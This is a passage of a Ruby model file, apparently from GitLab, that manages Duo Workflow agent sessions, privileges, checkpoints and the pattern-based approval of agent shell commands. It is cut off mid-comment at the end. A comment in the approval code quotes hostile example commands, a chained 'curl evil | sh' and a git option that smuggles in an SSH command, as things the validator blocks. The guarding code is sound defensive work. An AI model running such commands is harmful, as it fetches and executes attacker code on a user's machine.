# frozen_string_literal: true

require 'shellwords'

module Ai
  module DuoWorkflows
    class Workflow < ::ApplicationRecord
      include AfterCommitQueue
      include Gitlab::SQL::Pattern
      include Gitlab::Utils::StrongMemoize
      include FromUnion
      include EachBatch
      include Sortable
      include Todoable

      WORKLOAD_TAG = 'gitlab--duo'
      TITLE_MAX_LENGTH = 40
      GOAL_MAX_LENGTH = 16_384
      IMAGE_MAX_LENGTH = 2048
      SUMMARY_MAX_LENGTH = 1_024
      MODEL_METADATA_JSON_MAX_LENGTH = 1_024
      FLOW_METADATA_JSON_MAX_LENGTH = 1_024

      CyclicAncestryError = Class.new(StandardError)

      self.table_name = :duo_workflows_workflows

      belongs_to :user
      belongs_to :project, optional: true
      belongs_to :namespace, optional: true
      belongs_to :ai_catalog_item, optional: true, class_name: 'Ai::Catalog::Item'
      belongs_to :ai_catalog_item_version, optional: true, class_name: 'Ai::Catalog::ItemVersion'
      belongs_to :issue, optional: true
      belongs_to :work_item, optional: true, foreign_key: :issue_id, class_name: 'WorkItem', inverse_of: false
      belongs_to :merge_request, optional: true
      belongs_to :service_account, optional: true, class_name: 'User'

      has_many :checkpoints, class_name: 'Ai::DuoWorkflows::Checkpoint'
      # Lightweight association that excludes large jsonb columns (checkpoint,
      # metadata, ui_chat_log). Use this instead of :checkpoints when full
      # checkpoint data is not needed (e.g. presence checks, sorting by ts).
      has_many :basic_checkpoints,
        -> { select(:id, :workflow_id, :created_at, :thread_ts) },
        class_name: 'Ai::DuoWorkflows::Checkpoint',
        inverse_of: :workflow
      has_many :checkpoint_writes, class_name: 'Ai::DuoWorkflows::CheckpointWrite'
      # Instance-scoped to the workflow's daily partition: the partition key is the
      # workflow's created_at (set on every row by CreateCheckpointService), so every
      # read prunes to one partition of p_duo_workflows_checkpoint_* instead of
      # scanning all of them. Mirrors CI partition-scoped associations (Ci::Build).
      has_many :checkpoint_blobs, ->(workflow) { where(workflow_created_at: workflow.created_at) },
        class_name: 'Ai::DuoWorkflows::CheckpointBlob', inverse_of: :workflow
      has_many :checkpoint_headers, ->(workflow) { where(workflow_created_at: workflow.created_at) },
        class_name: 'Ai::DuoWorkflows::CheckpointHeader', inverse_of: :workflow
      has_many :events, class_name: 'Ai::DuoWorkflows::Event'
      has_many :workflows_workloads, class_name: 'Ai::DuoWorkflows::WorkflowsWorkload'
      has_many :workloads, through: :workflows_workloads, disable_joins: true
      has_many :work_item_links, class_name: 'Ai::DuoWorkflows::WorkflowWorkItem'
      has_many :linked_work_items, through: :work_item_links, source: :work_item, disable_joins: true
      has_many :merge_request_links, class_name: 'Ai::DuoWorkflows::WorkflowMergeRequest'
      has_many :linked_merge_requests, through: :merge_request_links, source: :merge_request, disable_joins: true
      has_many :note_links, class_name: 'Ai::DuoWorkflows::WorkflowNote'
      has_many :linked_notes, through: :note_links, source: :note, disable_joins: true
      has_many :pipeline_links, class_name: 'Ai::DuoWorkflows::WorkflowPipeline'
      has_many :linked_pipelines, through: :pipeline_links, source: :pipeline, disable_joins: true
      has_many :vulnerability_triggered_workflows, class_name: '::Vulnerabilities::TriggeredWorkflow'

      attr_readonly :trigger_source

      validates :status, presence: true
      validates :goal, length: { maximum: GOAL_MAX_LENGTH }
      validates :image, length: { maximum: IMAGE_MAX_LENGTH }, allow_blank: true
      validates :summary, length: { maximum: SUMMARY_MAX_LENGTH }, allow_blank: true
      validates :title, length: { maximum: TITLE_MAX_LENGTH }, allow_blank: true
      validates :model_metadata_json, length: { maximum: MODEL_METADATA_JSON_MAX_LENGTH }, allow_blank: true
      validates :flow_metadata_json, length: { maximum: FLOW_METADATA_JSON_MAX_LENGTH }, allow_blank: true

      validate :only_known_agent_privileges
      validate :only_known_pre_approved_agent_privileges
      validate :pre_approved_privileges_included_in_agent_privileges, on: :create
      validate :valid_service_account_user
      validate :item_matches_version

      before_create :set_title_from_workflow_definition, if: -> { title.blank? }

      validates :tool_call_approvals,
        json_schema: { filename: 'duo_tool_call_approvals', size_limit: 64.kilobytes }

      validates :messaging_callback_context,
        json_schema: { filename: 'duo_messaging_callback_context', size_limit: 16.kilobytes },
        allow_nil: true

      # `ide` is deprecated in favor of `chat`
      # `web` is deprecated in favor of `ambient`
      enum :environment, { ide: 1, web: 2, chat_partial: 3, chat: 4, ambient: 5, external: 6 }
      enum :trigger_source, { human: 0, system: 1, scheduled: 2 }, prefix: :triggered_by
      enum :sync_type, { hook: 0, fallback: 1, manual: 2 }, prefix: :sync

      scope :for_user_with_id!, ->(user_id, id) { find_by!(user_id: user_id, id: id) }
      scope :for_user, ->(user_id) { where(user_id: user_id) }
      scope :for_project, ->(project) { where(project: project) }
      scope :external, -> { where(environment: :external) }
      scope :ordered_by_id_desc, -> { order(id: :desc) }
      scope :for_agent_type, ->(agent_type) { where(agent_type: agent_type) }
      scope :for_status, ->(status) do
        value = state_machines[:status].states[status.to_sym]&.value
        value ? where(status: value) : none
      end
      scope :for_merge_request, ->(merge_request) { where(merge_request_id: merge_request) }
      scope :in_namespace, ->(namespace) {
        namespace_ids = namespace.self_and_descendants.select(:id)
        project_ids = ::Project.in_namespace(namespace_ids).select(:id)
        where(project_id: project_ids).or(where(namespace_id: namespace.id))
      }
      scope :in_namespace_hierarchy, ->(namespace) {
        namespace_ids = namespace.self_and_descendants.select(:id)
        project_ids = ::Project.in_namespace(namespace_ids).select(:id)

        # UNION ALL instead of OR: the check constraint guarantees exactly one
        # of project_id/namespace_id is set, so the arms are disjoint, and the
        # planner can drive each arm from its own index instead of scanning the
        # whole created_at range instance-wide.
        from_union([where(project_id: project_ids), where(namespace_id: namespace_ids)], remove_duplicates: false)
      }
      scope :stale_since, ->(time) { where(updated_at: ...time).order(updated_at: :asc, id: :asc) }
      scope :with_workflow_definition, ->(definition) { where(workflow_definition: definition) }
      scope :without_workflow_definition, ->(definition) { where.not(workflow_definition: definition) }
      scope :with_environment, ->(environment) { where(environment: environment) }
      scope :created_between, ->(from, to) { where(created_at: from...to) }
      scope :for_agent_class, ->(agent_class) do
        case agent_class
        when :internal_dap then where(agent_type: nil)
        when :external then where.not(agent_type: nil)
        else all
        end
      end
      scope :created_after, ->(time) { where('created_at > ?', time) }
      scope :created_before, ->(time) { where(created_at: ...time) }
      scope :from_pipeline, -> do
        without_workflow_definition(::Ai::FoundationalChatAgent.workflow_definitions)
          .with_environment(ENVIRONMENTS_FROM_PIPELINE)
      end
      scope :in_status_group, ->(status_group) do
        statuses_in_group = GROUPED_STATUSES.fetch(status_group.to_sym, [])

        if statuses_in_group.empty?
          none
        else
          state_machine_states = state_machines[:status].states
          status_db_values = statuses_in_group.map { |status| state_machine_states[status.to_sym].value }
          where(status: status_db_values)
        end
      end
      scope :order_by_status, ->(direction) do
        status_order_expression = Arel::Nodes::NamedFunction.new(
          'ARRAY_POSITION',
          [
            Arel.sql("ARRAY#{ordered_statuses}::smallint[]"),
            arel_table[:status]
          ]
        )

        final_order_expression =
          if direction.to_s.casecmp?('desc')
            status_order_expression.desc
          else
            status_order_expression.asc
          end

        order = Gitlab::Pagination::Keyset::Order.build([
          Gitlab::Pagination::Keyset::ColumnOrderDefinition.new(
            attribute_name: 'status',
            column_expression: status_order_expression,
            order_expression: final_order_expression,
            order_direction: direction,
            nullable: :not_nullable
          ),
          # Tie-breaker for deterministic ordering
          Gitlab::Pagination::Keyset::ColumnOrderDefinition.new(
            attribute_name: 'id',
            order_expression: arel_table[:id].desc,
            nullable: :not_nullable
          )
        ])

        reorder(order)
      end
      scope :updated_after, ->(time) { where(updated_at: time..) }
      scope :with_preloaded_associations, -> {
        preload(:project, :user, :namespace, :basic_checkpoints, ai_catalog_item_version: :item)
      }

      TARGET_STATUSES = {
        start: :running,
        pause: :paused,
        require_input: :input_required,
        require_plan_approval: :plan_approval_required,
        require_tool_call_approval: :tool_call_approval_required,
        resume: :running,
        retry: :running,
        finish: :finished,
        drop: :failed,
        stop: :stopped
      }.freeze

      GROUPED_STATUSES = {
        active: [:created, :running],
        paused: [:paused],
        awaiting_input: [:input_required, :plan_approval_required, :tool_call_approval_required],
        completed: [:finished],
        failed: [:failed],
        canceled: [:stopped]
      }.freeze

      TERMINAL_STATUSES = %i[finished failed stopped].freeze

      ENVIRONMENTS_FROM_PIPELINE = %w[web ambient].freeze
      ENVIRONMENTS_DEPRECATIONS = {
        'ide' => 'chat',
        'web' => 'ambient'
      }.freeze

      # Collapses environments renamed in 18.6 onto their replacement, so one person on
      # one product is one agent instance regardless of which spelling the caller used.
      # ENVIRONMENTS_DEPRECATIONS records these as `renamed`, so the pair is one concept
      # by definition, and both spellings have live writers: `web` from
      # Ai::Catalog::ExecuteWorkflowService and Ai::FlowTriggers::RunService, `ambient`
      # from the Duo Workflow Service `start_flow` tool. Built from the constants so the
      # mapping cannot drift from the enum.
      NORMALIZED_ENVIRONMENT =
        begin
          whens = ENVIRONMENTS_DEPRECATIONS.map do |from, to|
            "WHEN #{environments.fetch(from)} THEN #{environments.fetch(to)}"
          end

          "CASE environment #{whens.join(' ')} ELSE environment END".freeze
        end

      # Identifies one active agent instance for the governance metrics.
      #
      # Internal DAP sessions are keyed on (user, container, normalized environment),
      # where environment is the product (chat, ambient, chat_partial). The container is
      # both project_id and namespace_id, because `num_nonnulls(namespace_id,
      # project_id) = 1` means namespace-attached sessions carry a NULL project_id and
      # would otherwise collapse across every namespace in the hierarchy. External
      # sessions are keyed on (user, project, agent_type, agent_identity_id): an
      # external agent runs under whatever environment its session carries, and an
      # agent identity is one machine running one agent product for one user in one
      # project, so including it separates the same product run from two machines.
      # Sessions with no identity fall back to per-product, which is also what happens
      # if an identity is later deleted (the FK nullifies).
      #
      # `agent_type IS NULL` tells the two classes apart, so one expression restricts
      # correctly for either and the key spaces stay disjoint: ALL is exactly
      # INTERNAL_DAP + EXTERNAL.
      #
      # AGENT_INSTANCE_KEY_COLUMNS is shared with
      # Ai::Governance::ClickHouseMetricsService's mirror of this key, so the two
      # backends cannot drift on the identity columns; only the dialect-specific
      # normalized-environment term is written per side.
      AGENT_INSTANCE_KEY_COLUMNS =
        %w[user_id project_id namespace_id agent_type agent_identity_id].freeze

      AGENT_INSTANCE_KEY =
        "(#{AGENT_INSTANCE_KEY_COLUMNS.join(', ')}, " \
          "CASE WHEN agent_type IS NULL THEN #{NORMALIZED_ENVIRONMENT} END)".freeze

      class AgentPrivileges
        READ_WRITE_FILES  = 1
        READ_ONLY_GITLAB  = 2
        READ_WRITE_GITLAB = 3
        RUN_COMMANDS      = 4
        USE_GIT           = 5
        RUN_MCP_TOOLS     = 6
        START_FLOWS       = 7
        READ_ONLY_FILES   = 8

        ALL_PRIVILEGES = {
          READ_WRITE_FILES => {
            name: "read_write_files",
            description: "Allow local filesystem read/write access"
          }.freeze,
          READ_ONLY_GITLAB => {
            name: "read_only_gitlab",
            description: "Allow read only access to GitLab APIs"
          }.freeze,
          READ_WRITE_GITLAB => {
            name: "read_write_gitlab",
            description: "Allow write access to GitLab APIs"
          }.freeze,
          RUN_COMMANDS => {
            name: "run_commands",
            description: "Allow running any commands"
          }.freeze,
          USE_GIT => {
            name: "use_git",
            description: "Allow git commits, push and other git commands"
          }.freeze,
          RUN_MCP_TOOLS => {
            name: "run_mcp_tools",
            description: "Allow running MCP tools"
          }.freeze,
          START_FLOWS => {
            name: "start_flows",
            description: "Allow starting foundational flows from chat"
          }.freeze,
          READ_ONLY_FILES => {
            name: "read_only_files",
            description: "Allow local filesystem read access"
          }.freeze
        }.freeze

        DEFAULT_PRIVILEGES = [
          READ_WRITE_FILES,
          READ_ONLY_GITLAB,
          READ_WRITE_GITLAB,
          RUN_COMMANDS,
          USE_GIT,
          RUN_MCP_TOOLS
        ].freeze
      end

      # Value object for managing tool call approvals stored in JSONB
      class ToolCallApprovals
        CALL_ARGS_KEY = 'call_args'
        PATTERNS_KEY = 'patterns'
        COMMAND_TOOL_NAME = 'run_command'
        GIT_COMMAND_TOOL_NAME = 'run_git_command'
        COMMAND_TOOL_NAMES = [COMMAND_TOOL_NAME, GIT_COMMAND_TOOL_NAME].freeze
        MAX_PATTERNS_PER_TOOL = 100
        MAX_PATTERN_LENGTH = 256
        SHELL_METACHARACTERS = /[;&|<>$`(){}]/
        MATCH_TYPE_EXACT_HASH = 'exact_hash'
        MATCH_TYPE_PATTERN = 'pattern'

        ApprovalMatch = Struct.new(:matched, :match_type, :matched_pattern, keyword_init: true)

        NO_APPROVAL_MATCH = ApprovalMatch.new(matched: false).freeze

        def initialize(data = {})
          @approvals = data.dup
        end

        def add_approval(tool_name:, call_args:)
          call_args_hash = hash_call_args(call_args)
          @approvals[tool_name] ||= { CALL_ARGS_KEY => [] }

          # Handle both Set (in-memory) and Array (from JSONB) cases
          call_args_set = Set.new(@approvals[tool_name][CALL_ARGS_KEY])
          call_args_set.add(call_args_hash)
          @approvals[tool_name][CALL_ARGS_KEY] = call_args_set.to_a
        end

        def add_pattern_approval(tool_name:, pattern:)
          validate_pattern!(pattern)
          validate_command_tool_pattern!(tool_name, pattern)

          @approvals[tool_name] ||= { CALL_ARGS_KEY => [] }
          @approvals[tool_name][PATTERNS_KEY] ||= []

          patterns_set = Set.new(@approvals[tool_name][PATTERNS_KEY])
          patterns_set.add(pattern)

          if patterns_set.size > MAX_PATTERNS_PER_TOOL
            raise ArgumentError, "Maximum of #{MAX_PATTERNS_PER_TOOL} patterns per tool"
          end

          @approvals[tool_name][PATTERNS_KEY] = patterns_set.to_a
        end

        def approved?(tool_name:, call_args:)
          approval_match(tool_name: tool_name, call_args: call_args).matched
        end

        # Like approved?, but retains which mechanism/pattern matched, for audit purposes.
        def approval_match(tool_name:, call_args:)
          tool_approvals = @approvals[tool_name]
          return NO_APPROVAL_MATCH unless tool_approvals

          # Exact match always works -- this is the user's deliberate choice
          call_args_hash = hash_call_args(call_args)
          if tool_approvals[CALL_ARGS_KEY]&.include?(call_args_hash)
            return ApprovalMatch.new(matched: true, match_type: MATCH_TYPE_EXACT_HASH)
          end

          match_target = extract_match_target(tool_name, call_args)

          is_command_tool = COMMAND_TOOL_NAMES.include?(tool_name)

          # For command tools, validate the command is safe for pattern-based
          # approval. This combines two checks in a single tokenization pass:
          # 1. Reject shell metacharacters (prevents "git checkout main; curl evil | sh")
          # 2. Validate program-specific structure (prevents "git -c core.sshCommand=evil fetch")
          return NO_APPROVAL_MATCH if is_command_tool && !command_safe_for_pattern_approval?(match_target)

          matched_pattern = tool_approvals[PATTERNS_KEY]&.find do |pattern|
            if is_command_tool
              CommandPatternMatcher.match?(pattern, match_target)
            else
              File.fnmatch(pattern, match_target, File::FNM_DOTMATCH)
            end
          end

          return NO_APPROVAL_MATCH unless matched_pattern

          ApprovalMatch.new(matched: true, match_type: MATCH_TYPE_PATTERN, matched_pattern: matched_pattern)
        end

        def to_h
          @approvals
        end

        def [](key)
          @approvals[key]
        end

        def []=(key, value)
          @approvals[key] = value
        end

        def each
          @approvals.each { |tool_name, approval| yield tool_name, approval }
        end

        def empty?
          @approvals.empty?
        end

        def keys
          @approvals.keys
        end

        private

        # Checks whether the string contains shell metacharacters.
        # Used by both pattern validation (add_pattern_approval) and
        # the unified approval check (command_safe_for_pattern_approval?).
        def command_contains_shell_metacharacters?(match_target)
          return true if match_target.match?(/[\n\r]/)

          tokens = Shellwords.split(match_target)
          tokens.any? { |token| token.match?(SHELL_METACHARACTERS) }
        rescue ArgumentError
          # Unbalanced quotes - reject
          true
        end

        # Validates a command is safe for pattern-based approval.
        # Checks metacharacters first, then delegates to the program-specific
        # validator. Unregistered programs fail closed (exact-match only).
        def command_safe_for_pattern_approval?(match_target)
          return false if command_contains_shell_metacharacters?(match_target)

          tokens = Shellwords.split(match_target)
          return true if tokens.empty?

          program = tokens.first
          return false unless CommandValidators::Registry.registered?(program)

          validator = CommandValidators::Registry.validator_for(program)
          validator.safe_for_pattern_matching?(program: program, tokens: tokens[1..])
        rescue ArgumentError
          # Unbalanced quotes - reject (fail closed)
          false
        end

        # Extracts the string that patterns are matched against.
        # For command tools (run_command, run_git_command), returns the command
        # string so that users can write intuitive patterns like 'git checkout *'.
        # For all other tools, returns the raw call_args string.
        def extract_match_target(tool_name, call_args)
          return call_args unless tool_name == COMMAND_TOOL_NAME || tool_name == GIT_COMMAND_TOOL_NAME

          parsed = begin
            Gitlab::Json.safe_parse(call_args)
          rescue JSON::ParserError, EncodingError
            nil
          end
          return call_args unless parsed.is_a?(Hash)

          if tool_name == GIT_COMMAND_TOOL_NAME
            command = parsed['command'].to_s
            args = parsed['args']
            # join(' ') flattens array elements; args with embedded spaces merge
            # into the token stream. Not a security issue (metacharacter check
            # still applies) but patterns may not match as the user expects.
            args_str = args.is_a?(Array) ? args.join(' ') : args.to_s
            parts = ["git", command]
            parts << args_str if args_str.present?
            parts.join(' ')
          elsif parsed.key?('command')
            parsed['command'].to_s
          elsif parsed.key?('program')
            program = parsed['program'].to_s
            args = parsed['args']
            args_str = args.is_a?(Array) ? args.join(' ') : args.to_s
            args_str.present? ? "#{program} #{args_str}" : program
          else
            call_args
          end
        end

        def validate_pattern!(pattern)
          raise ArgumentError, "Pattern must be a non-empty string" unless pattern.is_a?(String) && !pattern.empty?

          return unless pattern.length > MAX_PATTERN_LENGTH

          raise ArgumentError, "Pattern must not exceed #{MAX_PATTERN_LENGTH} characters"
        end

        def validate_command_tool_pattern!(tool_name, pattern)
          return unless COMMAND_TOOL_NAMES.include?(tool_name)

          # Use Shellwords.split consistently with CommandPatternMatcher to
          # prevent shell-quoting bypasses (e.g. '"*"' or '"**"' evading
          # plain String#split checks). Parse failures fall through to the
          # metacharacter check which rejects unbalanced quotes.
          tokens = begin
            Shellwords.split(pattern)
          rescue ArgumentError
            nil
          end

          if tokens
            raise ArgumentError, "Wildcard-only patterns are not allowed for command tools" if tokens == ['*']

            # Block any pattern containing ** as a token. Leading ** (e.g. "** checkout")
            # bypasses the flag-rejection intent of constrained wildcards, and the gateway
            # only generates * patterns today. ** is reserved for future config-file use.
            raise ArgumentError, "Double wildcard (**) patterns are not allowed for command tools" if tokens.any?('**')
          end

          return unless command_contains_shell_metacharacters?(pattern)

          raise ArgumentError,
            "Patterns for command tools must not contain shell metacharacters (;, &, |, <, >, $, `, newlines, etc.)"
        end

        # Returns SHA256 hash of tool call args for storage
        # This ensures predictable payload size and allows equality comparison between different call args
        def hash_call_args(call_args)
          ::Digest::SHA256.hexdigest(call_args)
        end
      end

      # Scoped lookups for the compliance agent-artifacts download. The Workflow
      # is the source of truth present in Postgres on every instance, so reading
      # it directly works regardless of whether session analytics are backed by
      # Postgres or ClickHouse (the denormalized SessionArtifact table is only
      # populated when ClickHouse analytics are disabled).
      def self.find_in_project(project, id)
        for_project(project).find_by(id: id)
      end

      def self.find_in_namespace(namespace, id)
        in_namespace(namespace).find_by(id: id)
      end

      # Workflows linked to each of the given pipelines, keyed by pipeline id, so a
      # GraphQL batch loader can serve many pipelines from two indexed queries.
      def self.grouped_by_pipeline_id(pipeline_ids)
        ::Ai::DuoWorkflows::WorkflowPipeline
          .for_pipelines(pipeline_ids)
          .order(workflow_id: :desc)
          .preload(:workflow)
          .group_by(&:pipeline_id)
          .transform_values { |links| links.map(&:workflow) }
      end

      def self.target_status_for_event(status_event)
        TARGET_STATUSES[status_event]
      end

      # Evaluated once at workflow creation and snapshotted into the
      # incremental_checkpoints_enabled column (see CreateWorkflowService).
      # The flag must not change over a workflow's lifetime: incremental
      # checkpoint blobs are folded as deltas, so toggling mid-flight would
      # leave a chain that can't be reconstructed.
      #
      # This is the single source of truth for the flag. Capability
      # advertisement (FlowsMetadataService, direct_access) also routes through
      # it so the flag is resolved with the same actors everywhere -- a workflow
      # can't be told the feature is on while the gateway isn't sending blobs,
      # or vice versa.
      def self.incremental_checkpoints_enabled_for?(resource_parent)
        return false unless resource_parent

        Feature.enabled?(:duo_workflow_incremental_checkpoints, resource_parent) ||
          Feature.enabled?(:duo_workflow_incremental_checkpoints, resource_parent.root_ancestor)
      end

      def self.write_incremental_only_enabled_for?(resource_parent)
        return false unless resource_parent

        Feature.enabled?(:duo_workflow_write_incremental_only, resource_parent) ||
          Feature.enabled?(:duo_workflow_write_incremental_only, resource_parent.root_ancestor)
      end

      def self.ordered_statuses
        statuses_values = state_machines[:status].states

        GROUPED_STATUSES.flat_map do |_group, statuses|
          statuses.map do |status|
            statuses_values.fetch(status).value
          end
        end
      end

      # Single-pass session (rows) and agent (distinct active instances, see
      # AGENT_INSTANCE_KEY) totals for the current and previous windows, split at
      # `boundary` (the start of the current window). One aggregate over the whole
      # scope mirrors the ClickHouse countIf/uniqExactIf pass, so the namespace
      # hierarchy is resolved once instead of per metric.
      # Returns [sessions_current, sessions_previous, agents_current, agents_previous].
      def self.count_current_and_previous(boundary)
        quoted = connection.quote(boundary)
        agents = "COUNT(DISTINCT #{AGENT_INSTANCE_KEY})"

        pick(
          Arel.sql("COUNT(*) FILTER (WHERE created_at >= #{quoted})"),
          Arel.sql("COUNT(*) FILTER (WHERE created_at < #{quoted})"),
          Arel.sql("#{agents} FILTER (WHERE created_at >= #{quoted})"),
          Arel.sql("#{agents} FILTER (WHERE created_at < #{quoted})")
        )
      end

      # Session (rows) and agent (distinct active instances, see
      # AGENT_INSTANCE_KEY) counts per UTC time bucket, as
      # { Time => { sessions:, agents: } }.
      def self.counts_by_created_at_bucket(hourly: false)
        unit = hourly ? 'hour' : 'day'
        bucket = Arel.sql("DATE_TRUNC('#{unit}', created_at)")

        # rubocop:disable Database/AvoidUsingPluckWithoutLimit -- grouped aggregate, bounded to timeframe buckets
        group(bucket)
          .pluck(bucket, Arel.sql('COUNT(*)'), Arel.sql("COUNT(DISTINCT #{AGENT_INSTANCE_KEY})"))
          .to_h { |ts, sessions, agents| [ts.to_time.utc, { sessions: sessions, agents: agents }] }
        # rubocop:enable Database/AvoidUsingPluckWithoutLimit
      end

      def self.find_external_session(project:, session_id:)
        external.for_project(project).find_by(id: session_id)
      end

      def self.find_external_session_by_idempotency_key(project:, user_id:, idempotency_key:)
        external.for_project(project).find_by(user_id: user_id, idempotency_key: idempotency_key)
      end

      def only_known_agent_privileges
        self.agent_privileges ||= AgentPrivileges::DEFAULT_PRIVILEGES

        agent_privileges.each do |privilege|
          unless AgentPrivileges::ALL_PRIVILEGES.key?(privilege)
            errors.add(:agent_privileges, "contains an invalid value #{privilege}")
          end
        end
      end

      def chat?
        ::Ai::FoundationalChatAgent.foundational_workflow_definition?(workflow_definition)
      end

      def noteable
        noteable = issue.presence || merge_request.presence
        return unless noteable.respond_to?(:project) && noteable.project.present?

        noteable
      end

      # Flows that manage their own session notes (e.g. Code Review) opt out of
      # the generic agent-session-started/completed/failed system notes.
      def suppress_agent_session_note?
        !!::Ai::Catalog::FoundationalFlow[workflow_definition]&.suppress_agent_session_note
      end

      def from_pipeline?
        return false if chat?

        environment.in?(ENVIRONMENTS_FROM_PIPELINE)
      end

      def archived?
        created_at <= CHECKPOINT_RETENTION_DAYS.days.ago
      end

      def stalled?
        !created? && basic_checkpoints.empty?
      end

      def last_executor_logs_url
        last_workload&.logs_url
      end

      def all_executor_logs_urls
        workloads.order(created_at: :desc).filter_map(&:logs_url)
      end

      def last_workload
        @last_workload ||= workloads.order(created_at: :desc).first
      end

      # Intentionally avoids `last_workload` to prevent returning a stale memoized
      # workload when this method and `last_workload` are both called on the same object.
      def last_workload_pipeline_status
        workloads.order(created_at: :desc).first&.pipeline&.status&.to_sym
      end

      def project_level?
        project_id.present?
      end

      def namespace_level?
        namespace_id.present?
      end

      def resource
        issue || merge_request
      end

      def resource_iid
        resource&.iid
      end

      def resource_web_url
        return unless resource

        Gitlab::UrlBuilder.build(resource)
      end

      def resource_parent
        project || namespace
      end

      # Live flag: stop shadow-writing the full checkpoint row once the read path
      # is live. Requires incremental checkpoints, so blobs are always written.
      def write_incremental_only?
        incremental_checkpoints_enabled? &&
          self.class.write_incremental_only_enabled_for?(resource_parent)
      end

      def to_ability_name
        'duo_workflow'
      end

      # Atomically merge a partial update into the messaging_callback_context
      # jsonb column (Postgres `||`, not a Ruby read-modify-write) so concurrent
      # writers -- e.g. the progress cursor vs an adapter's status_ts -- don't
      # clobber each other's keys. Like update_column, this bypasses the column's
      # json_schema validation.
      def merge_messaging_callback_context!(attrs)
        self.class.where(id: id).update_all(
          ActiveRecord::Base.sanitize_sql_array([
            "messaging_callback_context = COALESCE(messaging_callback_context, '{}'::jsonb) || ?::jsonb",
            Gitlab::Json.dump(attrs)
          ])
        )

        # Best-effort in-memory sync; the DB row is authoritative.
        self.messaging_callback_context = (messaging_callback_context || {}).merge(attrs.stringify_keys)
      end

      # Latest cumulative ui_chat_log. Memoized: the worker and adapter both read it.
      def latest_ui_chat_log
        ui_chat_log_for(latest_readable_checkpoint)
      end
      strong_memoize_attr :latest_ui_chat_log

      def associated_pipelines
        workloads.includes(:pipeline).filter_map(&:pipeline).uniq
      end

      def mcp_enabled?
        return true if resource_parent.root_ancestor.duo_workflow_mcp_enabled

        false
      end

      # Gates reading channel_values back from incremental checkpoint blobs
      # (e.g. the workflow trace). Separate from the write flag so the read path
      # can be rolled out independently once blobs are reliably persisted.
      def read_incremental_checkpoints_enabled?
        return false unless resource_parent

        Feature.enabled?(:duo_workflow_read_incremental_checkpoints, resource_parent) ||
          Feature.enabled?(:duo_workflow_read_incremental_checkpoints, resource_parent.root_ancestor)
      end

      # Whether to serve channel_values reconstructed from incremental blobs.
      # Requires the read FF *and* that this workflow was created with incremental
      # checkpoints enabled (the snapshotted incremental_checkpoints_enabled
      # column). A workflow that never wrote blobs has nothing to fold, so it must
      # keep serving the full checkpoint header regardless of the read FF.
      def reconstruct_from_blobs?
        read_incremental_checkpoints_enabled? && incremental_checkpoints_enabled?
      end

      # Per-consumer gate for the messaging/notifications ui_chat_log reads, so they
      # roll out independently of the other read consumers.
      def reconstruct_from_blobs_for_notifications?
        return false unless reconstruct_from_blobs?

        Feature.enabled?(:dw_read_blobs_notifications, resource_parent) ||
          Feature.enabled?(:dw_read_blobs_notifications, resource_parent.root_ancestor)
      end

      # Latest record to read ui_chat_log from: the slim CheckpointHeader when gated,
      # else the full Checkpoint. Both carry thread_ts for use as a cursor identity.
      def latest_readable_checkpoint
        if reconstruct_from_blobs_for_notifications?
          latest_checkpoint_header
        else
          checkpoints.latest
        end
      end

      # ui_chat_log for a #latest_readable_checkpoint record: folded from blobs when
      # gated, else read from the checkpoint channel_values.
      def ui_chat_log_for(record)
        return [] unless record

        log =
          if reconstruct_from_blobs_for_notifications?
            reconstructed_channel(record, 'ui_chat_log')
          else
            record.ui_chat_log
          end

        log.is_a?(Array) ? log : []
      end

      # Per-consumer gate for the internal REST checkpoint list endpoint, so it rolls
      # out independently of other consumers like trace.jsonl or the GraphQL fields.
      def reconstruct_from_blobs_for_list?
        return false unless reconstruct_from_blobs?

        Feature.enabled?(:dw_read_blobs_list, resource_parent) ||
          Feature.enabled?(:dw_read_blobs_list, resource_parent.root_ancestor)
      end

      # Per-consumer gate for GraphQL checkpoint reads: first/latest checkpoint
      # lookup (WorkflowPresenter) and the checkpoint/compressedCheckpoint/
      # duoMessages fields (WorkflowCheckpointEventPresenter), so this surface
      # rolls out independently of other consumers like trace.jsonl.
      def reconstruct_from_blobs_for_graphql?
        return false unless reconstruct_from_blobs?

        Feature.enabled?(:dw_read_blobs_graphql, resource_parent) ||
          Feature.enabled?(:dw_read_blobs_graphql, resource_parent.root_ancestor)
      end

      # Latest shadow-written header for `thread_ts`. Headers are append-only (a
      # re-sent checkpoint writes another row), so the highest id is the newest.
      def checkpoint_header_for(thread_ts)
        checkpoint_headers
          .where(thread_ts: thread_ts)
          .order(:id)
          .last
      end

      # Newest header across the workflow (or one lineage), ordered by DWS
      # thread_ts (a time-ordered UUID; see CheckpointHeader.in_checkpoint_order).
      # Mirrors `Checkpoint.latest`'s `checkpoint_ns:` argument, which defaults to
      # nil (the flow's own top-level lineage) so a nested subagent's header
      # can't outrank it.
      #
      # It omits Checkpoint.latest's created_at + CLOCK_SKEW_BUFFER bound. That
      # bound keeps Checkpoint's created_at partition pruning safe under Rails clock
      # skew. This path prunes by workflow_created_at instead, so it needs neither
      # the bound nor the margin. Omitting it changes behavior: we keep a header even
      # when its Rails insert clock ran fast. We order by thread_ts, not created_at,
      # so that is correct.
      def latest_checkpoint_header(checkpoint_ns: nil)
        checkpoint_headers.for_checkpoint_ns(checkpoint_ns).in_checkpoint_order.last
      end

      # Oldest header across the workflow (or one lineage). Mirrors
      # `Checkpoint.earliest`; see `#latest_checkpoint_header` for why this
      # orders by thread_ts rather than created_at and skips its clock-skew bound.
      def earliest_checkpoint_header(checkpoint_ns: nil)
        checkpoint_headers.for_checkpoint_ns(checkpoint_ns).in_checkpoint_order.first
      end

      # Blobs on `checkpoint`'s ancestor chain within its current_thread group,
      # oldest-first. Groups are self-contained (each opens with a full compaction
      # snapshot), so one group reconstructs on its own. A fork/rollback
      # (ai-assist#2440) can leave two chains in one group, so restrict to the
      # on-path thread_ts (#ancestor_thread_ts) -- a sibling's blobs share
      # (channel, version) and would corrupt the fold.
      #
      # project_id is the leading column of idx_duo_wf_checkpoint_blobs_dedup, so
      # including it lets that index serve the lookup; the daily-partition bound
      # comes from the checkpoint_blobs association scope. `channels`, when given,
      # restricts the query to those channels so callers that can't return the
      # rest (e.g. the non-owner trace) don't fetch and decompress them.
      def accumulated_blobs_for(checkpoint, channels: nil)
        scope = checkpoint_blobs
          .where(
            project_id: project_id,
            current_thread: checkpoint.current_thread,
            thread_ts: ancestor_thread_ts(checkpoint)
          )
        scope = scope.where(channel: channels) if channels
        scope.order(:id)
      end

      # thread_ts of `checkpoint` and its ancestors up to its current_thread group
      # start, walking the header parent_ts chain. The group start's parent_ts
      # points outside the group's header set, ending the walk; off-path
